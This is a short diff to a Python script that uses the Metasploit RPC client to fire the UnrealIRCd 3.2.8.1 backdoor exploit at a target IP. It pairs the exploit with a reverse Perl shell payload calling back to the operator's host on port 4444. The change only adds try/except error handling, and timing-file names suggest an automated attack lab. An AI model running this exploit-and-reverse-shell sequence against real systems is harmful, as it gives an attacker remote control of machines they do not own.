@@ -22,14 +22,19 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
-    exploit['RHOSTS'] = target_ip
-    exploit['RPORT'] = 6697
-    payload['LHOST'] = my_ip
-    payload['LPORT'] = 4444
+    try:
+        exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
+        exploit['RHOSTS'] = target_ip
+        exploit['RPORT'] = 6697
+        payload['LHOST'] = my_ip
+        payload['LPORT'] = 4444
 
-    exploit.execute(payload=payload)
+        exploit.execute(payload=payload)
+    
+    except Exception as e:
+        print(e)
+        pass
     
     time.sleep(60)
     output_time_file_end = 'time_step_3_end.txt'
